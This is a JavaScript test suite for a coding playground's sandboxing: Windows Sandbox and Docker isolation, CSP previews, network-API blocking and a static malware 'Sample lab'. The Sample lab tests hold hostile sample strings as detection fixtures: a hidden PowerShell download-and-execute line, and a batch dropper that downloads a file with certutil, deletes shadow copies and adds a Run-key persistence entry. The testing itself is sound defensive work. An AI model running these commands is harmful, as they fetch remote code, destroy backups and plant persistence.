// Cyber › Coding › safe sandboxes: Windows Sandbox config and runner, the Playground's backend routing, the Docker
// input envelope, the HTML preview CSP, and the browser worker's network seal. These are the checks that keep a
// native language from quietly falling back to running as the signed-in Windows user.
const fs = require('fs');
const path = require('path');

module.exports = async ok => {
  const root = path.join(__dirname, '..'), rd = f => fs.readFileSync(path.join(root, f), 'utf8');
  const sandbox = require('../lib/code-sandbox-windows.js');
  const playground = require('../lib/code-playground.js');

  /* ----- Windows Sandbox ----- */
  const wsb = sandbox.wsbFor('C:\\input & code', 'C:\\output');
  ok('windows sandbox: networking, clipboard, printer, camera and microphone are off',
    /<Networking>Disable<\/Networking>/.test(wsb) && /<ClipboardRedirection>Disable<\/ClipboardRedirection>/.test(wsb) &&
    /<PrinterRedirection>Disable<\/PrinterRedirection>/.test(wsb) && /<VideoInput>Disable<\/VideoInput>/.test(wsb) &&
    /<AudioInput>Disable<\/AudioInput>/.test(wsb) && /<ProtectedClient>Enable<\/ProtectedClient>/.test(wsb));
  ok('windows sandbox: the program folder is read-only and only the result folder is writable',
    /<SandboxFolder>oa-in<\/SandboxFolder>[\s\S]*?<ReadOnly>true<\/ReadOnly>/.test(wsb) &&
    /<SandboxFolder>oa-out<\/SandboxFolder>[\s\S]*?<ReadOnly>false<\/ReadOnly>/.test(wsb));
  ok('windows sandbox: host paths are XML-escaped', /C:\\input &amp; code/.test(wsb) && /runner\.ps1/.test(wsb));
  const runner = sandbox.runnerScript();
  ok('windows sandbox: the trusted runner limits time and output and kills the whole process tree',
    /Start-Process/.test(runner) && /RedirectStandardInput/.test(runner) && /taskkill\.exe/.test(runner) &&
    /\/T/.test(runner) && /\/F/.test(runner) && /262144/.test(runner) && /Read-Capped/.test(runner));
  ok('windows sandbox: the result is written atomically and the disposable VM shuts down',
    /result\.tmp/.test(runner) && /Move-Item/.test(runner) && /result\.json/.test(runner) && /shutdown\.exe/.test(runner));
  ok('windows sandbox: every Windows-native language has a runner case',
    ['powershell', 'batch', 'vbscript', 'jscript'].every(id => new RegExp("'" + id + "'").test(runner)));

  /* ----- backend routing ----- */
  ok('playground: the API never imports the trusted host runner',
    !/require\(['"]\.\/code-playground-local['"]\)/.test(rd('lib/code-playground.js')));
  const status = playground.status();
  ok('playground: status names both safe backends and never a host runner',
    !!status.sandbox && typeof status.sandbox.available === 'boolean' &&
    !!status.docker && typeof status.docker.ready === 'boolean' && !!status.backend);
  ok('playground: the Docker list is the container toolchains and the Sandbox list is the Windows scripts',
    playground.LANGS.has('c') && playground.LANGS.has('rust') && playground.SANDBOX.has('powershell') &&
    playground.SANDBOX.has('batch') && !playground.SANDBOX.has('c') && !playground.LANGS.has('nodejs'));
  ok('playground: validation accepts a safe language and refuses unknown, empty and oversized programs',
    playground.validate({ lang: 'bash', code: 'echo Hello' }) &&
    !playground.validate({ lang: 'unknown', code: 'echo Hello' }) &&
    !playground.validate({ lang: 'bash', code: '  ' }) &&
    !playground.validate({ lang: 'bash', code: 'x'.repeat(200001) }));
  if (!status.sandbox.available) {
    const r = await playground.run({ lang: 'batch', code: 'echo Hello' });
    ok('playground: Windows-only code is refused when Windows Sandbox is not turned on', r.unavailable === true && r.ok === false && /Windows Sandbox/.test(r.error), JSON.stringify(r));
  } else ok('playground: Windows Sandbox is available here (refusal check skipped)', true);
  if (!status.backend.c) {
    const r = await playground.run({ lang: 'c', code: 'int main(void) { return 0; }' });
    ok('playground: C is refused when Docker is not ready', r.unavailable === true && r.ok === false && /Docker/.test(r.error), JSON.stringify(r));
  } else ok('playground: Docker is available here (refusal check skipped)', true);

  /* ----- Docker input envelope ----- */
  const sh = rd('lib/code-playground/run.sh');
  ok('docker: the runner splits the source and Input box from one envelope, refuses a bad one, then feeds the program from a file',
    /read -r src_bytes in_bytes/.test(sh) && /\*\[!0-9:\]\*/.test(sh) && /head -c "\$1"/.test(sh) &&
    /take "\$src_bytes" "\$src"/.test(sh) && /take "\$in_bytes" "\$input"/.test(sh) && /< "\$input"/.test(sh));

  /* ----- HTML previews ----- */
  const PLAY = require('../web/js/code-playground-langs.js');
  const plain = PLAY.previewDoc('<!doctype html><html><body><script>alert(1)</script></body></html>');
  ok('preview: the no-script CSP is injected after the doctype and blocks every network request',
    plain.indexOf('<!doctype') === 0 && plain.indexOf('Content-Security-Policy') > 0 &&
    /default-src 'none'/.test(plain) && /script-src 'none'/.test(plain) && /connect-src 'none'/.test(plain));
  const scripted = PLAY.previewDoc('<html><body><script>1</script></body></html>', true);
  ok('preview: the terminal can allow inline scripts but still blocks the network',
    /script-src 'unsafe-inline'/.test(scripted) && /connect-src 'none'/.test(scripted) && /img-src data: blob:/.test(scripted));
  const runnerUi = rd('web/js/code-runner.js');
  ok('code runner: the HTML frame cannot open popups and uses the no-network preview',
    !/allow-popups/.test(runnerUi) && /previewDoc\(r\.html\)/.test(runnerUi) && /sandbox', 'allow-scripts allow-modals'/.test(runnerUi));
  const lessonsUi = rd('web/js/code-lessons.js'), langsUi = rd('web/js/code-playground-langs.js');
  ok('coding: the Playground promises nothing runs as the Windows user and previews use the CSP',
    !/runs on this PC as your Windows user/.test(lessonsUi) && /no program you type here can reach your PC/.test(langsUi) &&
    /BROWSER_ONLY = true/.test(langsUi) &&
    /CodeStage\.(mount|doc|pictures|page)/.test(lessonsUi) && /PL\.SANDBOX/.test(lessonsUi));

  /* ----- the worker seal ----- */
  const interp = rd('web/js/interp.js');
  ok('interp: fetch is replaced on the prototype chain and the original is kept in a closure',
    /function sealNetwork\(\)/.test(interp) && /replaceOn\(g, 'fetch', net\)/.test(interp) &&
    /var real = g\.fetch/.test(interp) && /Object\.defineProperty\(p, key/.test(interp));
  ok('interp: the other network APIs are blocked, including beacon, WebTransport and WebRTC',
    ['sendBeacon', 'WebTransport', 'WebSocketStream', 'RTCPeerConnection', 'EventSource', 'XMLHttpRequest', 'importScripts', 'BroadcastChannel', 'SharedWorker', 'Worker', 'serviceWorker']
      .every(name => interp.includes(name)));
  ok('interp: only URLs under the Pyodide folder are allowed, and encoded separators are rejected',
    /new URL\(String\(g\.__allow\)/.test(interp) && /%2f\|%5c\|%2e/.test(interp) && /indexOf\(base\) !== 0/.test(interp));

  /* ----- an outcome for every language, whatever the code is ----- */
  const noStatus = { sandbox: { available: false, languages: [] }, docker: { installed: false, running: false, image: false, ready: false }, backend: {} };
  const dockerReady = { sandbox: { available: false, languages: [] }, docker: { installed: true, running: true, image: true, ready: true }, backend: { c: 'docker', bash: 'docker', rust: 'docker' } };
  const sandboxReady = { sandbox: { available: true, languages: ['powershell', 'batch', 'vbscript', 'jscript'] }, docker: { installed: false, running: false, image: false, ready: false }, backend: { powershell: 'windows-sandbox', batch: 'windows-sandbox', vbscript: 'windows-sandbox', jscript: 'windows-sandbox' } };
  const statuses = [null, noStatus, dockerReady, sandboxReady, Object.assign({}, noStatus, { failed: true })];
  const routes = PLAY.LANGS.flatMap(l => statuses.map(s => ({ l, r: PLAY.route(l, s) })));
  const sealed = new Set(['app', 'mini', 'eso', 'pc', 'docker']);
  ok('playground: every language has a route in every status state, and every refusal has a reason',
    routes.every(({ r }) => sealed.has(r.g) || (r.g === 'none' && typeof r.why === 'string' && r.why.trim().length > 12 &&
      !/undefined|null|NaN/.test(r.why))), JSON.stringify(routes.filter(({ r }) => r.g === 'none' && !(r.why && r.why.trim().length > 12)).slice(0, 3)));
  ok('playground: nothing is silently unrunnable — every language runs in a sealed route or says why it cannot',
    PLAY.LANGS.every(l => { const r = PLAY.route(l, noStatus); return sealed.has(r.g) || !!r.why; }));
  ok('playground: this browser-only build never routes a native language to the PC, whatever the status says',
    PLAY.LANGS.filter(l => ['docker', 'local'].includes(l.run)).every(l => statuses.every(s => {
      const r = PLAY.route(l, s); return r.g === 'none' && /disabled in this build/.test(r.why);
    })) &&
    PLAY.LANGS.some(l => l.run === 'local') && PLAY.LANGS.some(l => l.run === 'docker'));
  ok('playground: a failed status call never leaves a language with a blank or "undefined" reason',
    [null, Object.assign({}, noStatus, { failed: true })].every(s => PLAY.LANGS.every(l => {
      const r = PLAY.route(l, s);
      return sealed.has(r.g) || (r.g === 'none' && typeof r.why === 'string' && r.why.trim().length > 12 && !/undefined|null|NaN/.test(r.why));
    })));
  ok('playground: even with Docker ready, a container language is refused rather than run on this PC',
    PLAY.route(PLAY.byId('c'), dockerReady).g === 'none' && /browser sandbox/.test(PLAY.route(PLAY.byId('c'), dockerReady).why) &&
    PLAY.route(PLAY.byId('batch'), dockerReady).g === 'none');
  ok('playground: even with Windows Sandbox ready, a Windows script is refused rather than run on this PC',
    PLAY.route(PLAY.byId('powershell'), sandboxReady).g === 'none' && /browser sandbox/.test(PLAY.route(PLAY.byId('powershell'), sandboxReady).why) &&
    PLAY.route(PLAY.byId('c'), sandboxReady).g === 'none');

  /* output that never stops is capped while it is produced, so a run always ends with a readable result */
  ok('interp: Python output is capped at 200 KB per stream with a truncation note',
    /cut\[k\]>=200000/.test(interp) && /output truncated at 200 KB/.test(interp) && /setStdout\(\{batched:s=>\{put\(out,"o",s\)/.test(interp));
  ok('interp: a run that hits the time limit still reports what it printed before it was stopped',
    /progress:out\.join/.test(interp) && (interp.match(/stdout: partial/g) || []).length >= 2);
  ok('interp: JavaScript output is capped the same way, and returned values are trimmed',
    /used>=200000/.test(interp) && /output truncated at 200 KB/.test(interp) && /const show=v=>/.test(interp) && /slice\(0,20000\)/.test(interp));

  /* the boxing flags on the container (no network, read-only, unprivileged, bounded) */
  ok('docker: runs with no network, a read-only root, an unprivileged user and bounded cpu, memory and pids',
    /--network=none/.test(rd('lib/code-playground.js')) && /--read-only/.test(rd('lib/code-playground.js')) &&
    /--user=65534:65534/.test(rd('lib/code-playground.js')) && /--pids-limit=128/.test(rd('lib/code-playground.js')) &&
    /--memory=1g/.test(rd('lib/code-playground.js')) && /--cap-drop=ALL/.test(rd('lib/code-playground.js')) &&
    /--security-opt=no-new-privileges/.test(rd('lib/code-playground.js')));
  ok('playground: a PC-only language cannot reach the host runner through the API',
    !playground.validate({ lang: 'nodejs', code: 'console.log(1)' }) &&
    !playground.validate({ lang: 'perl', code: 'print 1' }) &&
    !playground.validate({ lang: 'awk', code: 'BEGIN{print 1}' }));
  ok('code runner: a native run is given a two-minute answer even if the sandbox never replies',
    /150000/.test(runnerUi) && /did not answer within 2 minutes/.test(runnerUi));
  ok('coding: the Playground turns a still-loading status into a message, not a blank run',
    /w\.checking/.test(lessonsUi) && /Checking which safe sandboxes are available/.test(lessonsUi) &&
    /did not answer within 2 minutes/.test(lessonsUi));

  /* ----- the Screen: games, pictures and full screen ----- */
  const stageUi = rd('web/js/code-stage.js');
  const stageSandbox = (/const SANDBOX = '([^']+)'/.exec(stageUi) || [])[1] || '';
  ok('screen: a program runs in an opaque sandbox with scripts, but no same-origin, popups, forms or top navigation',
    /allow-scripts/.test(stageSandbox) && /allow-pointer-lock/.test(stageSandbox) &&
    !/allow-same-origin|allow-popups|allow-forms|allow-top-navigation/.test(stageSandbox));
  ok('screen: every page goes through the Playground CSP, so scripts run while every network request stays blocked',
    /PL\.previewDoc\(text/.test(stageUi) && /previewDoc\(text, opts\.scripts !== false\)/.test(stageUi) &&
    /connect-src 'none'/.test(rd('web/js/code-playground-langs.js')));
  ok('screen: console output, errors and rejected promises are sent back to the page that shows it',
    /msStage/.test(stageUi) && /unhandledrejection/.test(stageUi) && /console\[kind\]/.test(stageUi) && /onLog/.test(stageUi));
  ok('screen: full screen is asked of the screen itself, with an Esc fallback when the window refuses',
    /requestFullscreen/.test(stageUi) && /exitFullscreen/.test(stageUi) && /Escape/.test(stageUi) && /cs-max/.test(stageUi));
  ok('screen: JavaScript can be run as a real page, and a closing script tag in it cannot break out',
    /function page\(/.test(stageUi) && stageUi.indexOf('script/gi') > 0 && /function pictures\(/.test(stageUi));
  ok('playground: HTML and JavaScript page mode run on the Screen, with pictures and a page option',
    /id="plstage"/.test(lessonsUi) && /CodeStage\.mount/.test(lessonsUi) && /plstage/.test(lessonsUi) &&
    /data-cl="ppage"/.test(lessonsUi) && /Run on the screen/.test(lessonsUi) && /CodeStage\.pictures/.test(lessonsUi) &&
    /CodeStage\.page\(code\)/.test(lessonsUi));
  ok('code runner: an HTML run plays in the same sandboxed screen with full screen',
    /CodeStage\.mount/.test(runnerUi) && /stage\.show\(r\.html\)/.test(runnerUi) && /Full screen to play/.test(runnerUi) &&
    !/allow-popups/.test(runnerUi));

  /* ----- Scratch and the interface each language opens ----- */
  ok('playground: Scratch is a blocks language, and the shells open the Terminal playground',
    !!PLAY.byId('scratch') && PLAY.route(PLAY.byId('scratch'), null).g === 'app' &&
    PLAY.SHELLS.bash === 'bash' && PLAY.SHELLS.powershell === 'powershell' && PLAY.SHELLS.batch === 'cmd' &&
    Object.keys(PLAY.SHELLS).length === 3);
  { const vm = require('vm'), win = {};
    vm.runInNewContext(rd('web/js/code-scratch.js'), {
      window: win, console,
      document: { getElementById: () => null, head: { appendChild() { } }, createElement: () => ({ style: {} }) },
    });
    const S = win.CodeScratch;
    const script = 'when flag clicked\n  repeat 2\n    move 5 steps\n    say Hi for 1\nwhen key space pressed\n  pen down';
    const blocks = S.parse(script);
    const page = S.program(script);
    ok('scratch: hats, repeat bodies and keys survive a parse and a round trip through the saved text',
      blocks.length === 2 && blocks[0].body[0].op === 'repeat' && blocks[0].body[0].body.length === 2 &&
      blocks[1].key === 'space' && S.text(S.parse(S.text(blocks))) === S.text(blocks));
    ok('scratch: a script becomes a sealed page with the sprite runtime, both hats and no network',
      /S\.onFlag/.test(page) && /S\.onKey\("space"/.test(page) && /for \(var i_1/.test(page) &&
      /S_api2/.test(page) && /requestFullscreen|keydown/.test(page));
    ok('scratch: the playground shows blocks for Scratch and the Terminal playground for a shell, and keeps the editor otherwise',
      /CodeScratch\.editor/.test(lessonsUi) && /id="clblocks"/.test(lessonsUi) && /mountTerminal/.test(lessonsUi) &&
      /terminal_playground/.test(lessonsUi) && /x\.term/.test(lessonsUi) && /editorKeys\(ed, plang, playRun\)/.test(lessonsUi));
  }

  /* ----- the Sample lab: a sample is read without running, and run only inside Windows Sandbox ----- */
  const lab = require('../lib/sample-lab');
  ok('sample lab: reading a sample cannot run it — the analyser has no process, shell or file-write module',
    !/child_process|execFile|execSync|spawn\(/.test(rd('lib/sample-lab.js')) &&
    /analyzeBuffer/.test(rd('lib/sample-lab.js')) && typeof lab.analyze === 'function');
  {
    const pe = Buffer.alloc(0x800);
    pe.write('MZ', 0, 'latin1'); pe.writeUInt32LE(0x80, 0x3c); pe.write('PE\u0000\u0000', 0x80, 'latin1');
    pe.writeUInt16LE(0x8664, 0x84); pe.writeUInt16LE(1, 0x86); pe.writeUInt16LE(0xf0, 0x94);
    pe.writeUInt16LE(0x20b, 0x98); pe.writeUInt16LE(3, 0x98 + 68);
    const at = 0x80 + 24 + 0xf0;
    pe.write('.text', at, 'latin1'); pe.writeUInt32LE(0x200, at + 16); pe.writeUInt32LE(0x400, at + 20); pe.writeUInt32LE(0x60000020, at + 36);
    for (let i = 0x400; i < 0x600; i++) pe[i] = (i * 7) % 256;
    pe.write('VirtualAllocEx CreateRemoteThread', 0x400, 'latin1');
    const r = lab.analyze({ name: 'evil.exe', b64: pe.toString('base64') });
    ok('sample lab: a PE header is read (machine, subsystem, sections) and hashes are real',
      r.kind === 'pe' && r.pe && r.pe.machine === 'x64 (64-bit)' && r.pe.subsystem === 'Windows console' &&
      r.pe.sections.length === 1 && r.pe.sections[0].name === '.text' && r.pe.sections[0].exec === true &&
      r.pe.sections[0].entropy > 7 && r.size === 0x800 && /^[0-9a-f]{64}$/.test(r.sha256) && /^[0-9a-f]{32}$/.test(r.md5));
    ok('sample lab: injection APIs in the bytes are reported as indicators',
      r.findings.some(f => f.label === 'Uses VirtualAllocEx') && r.findings.some(f => /Uses CreateRemoteThread/.test(f.label)));
    const ps = lab.analyze({ name: 'dropper.ps1', text: 'IEX (New-Object Net.WebClient).DownloadString("http://185.1.2.3/a.ps1")\nStart-Process powershell -WindowStyle Hidden' });
    ok('sample lab: a PowerShell downloader is high severity, with its URL and IP pulled out',
      ps.kind === 'script' && ps.script === 'powershell' && ps.verdict.level === 'high' &&
      ps.findings.some(f => f.label === 'Runs a string as code') && ps.findings.some(f => f.label === 'Downloads something') &&
      ps.indicators.urls[0] === 'http://185.1.2.3/a.ps1' && ps.indicators.ips[0] === '185.1.2.3');
    const bat = lab.analyze({ name: 'a.bat', text: '@echo off\ncertutil -urlcache -f http://x.example.com/a.exe a.exe\nvssadmin delete shadows /all /quiet\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Up /d a.exe' });
    ok('sample lab: a batch dropper is flagged for its download, backup deletion and Run key',
      bat.script === 'batch' && bat.verdict.level === 'high' &&
      bat.findings.some(f => /Downloads through a Windows tool/.test(f.label)) &&
      bat.findings.some(f => /Destroys backups/.test(f.label)) &&
      bat.findings.some(f => /persistence/.test(f.label)) && bat.indicators.registry.some(k => /CurrentVersion/.test(k)));
    const sniffed = lab.analyze({ name: 'pasted.txt', text: "IEX (New-Object Net.WebClient).DownloadString('http://185.1.2.3/a.ps1')\nStart-Process powershell -WindowStyle Hidden" });
    ok('sample lab: a pasted script with no useful name is still read as PowerShell',
      sniffed.kind === 'script' && sniffed.script === 'powershell' && sniffed.verdict.level === 'high' &&
      sniffed.findings.some(f => f.label === 'Downloads something')) &&
    ok('sample lab: text is read as text, and an empty or missing sample is refused',
      lab.analyze({ name: 'notes.txt', text: 'just some notes, see https://example.com' }).kind === 'text' &&
      (() => { try { lab.analyze({}); return false; } catch (e) { return /Send a sample/.test(e.message); } })() &&
      (() => { try { lab.analyze({ name: 'x', text: '   ' }); return false; } catch (e) { return true; } })());
  }
  {
    const ps1 = lab.analyze({ name: 'a.ps1', text: 'Write-Host hi' });
    ok('sample lab: running is gated on Windows Sandbox and says why when it is not available',
      ps1.runBackend === 'windows-sandbox' && ps1.canRun === sandbox.status().available &&
      (ps1.canRun || /Windows Sandbox is not turned on/.test(ps1.runWhy)));
  }
  ok('sample lab: the sandbox keeps sample bytes untouched and reports processes, files and time',
    /writeFileSync\(path\.join\(inputFolder, 'sample\.'/.test(rd('lib/code-sandbox-windows.js')) &&
    /processes/.test(sandbox.sampleRunnerScript()) && /files/.test(sandbox.sampleRunnerScript()) &&
    /Stop-Process|taskkill/.test(sandbox.sampleRunnerScript()) && /shutdown\.exe/.test(sandbox.sampleRunnerScript()) &&
    Object.keys(sandbox.SAMPLE_SCRIPT).length === 4);
  ok('sample lab: the Sample lab page exists in the coding section, with an explicit static-only promise',
    /data-cl="slab"/.test(lessonsUi) && /Sample lab/.test(lessonsUi) && /\/api\/sample-lab\/analyze/.test(lessonsUi) &&
    /\/api\/sample-lab\/run/.test(lessonsUi) && /Reading never runs the file/.test(lessonsUi) &&
    /\/api\/sample-lab\/analyze/.test(rd('server.js')) && /\/api\/sample-lab\/run/.test(rd('server.js')));
};
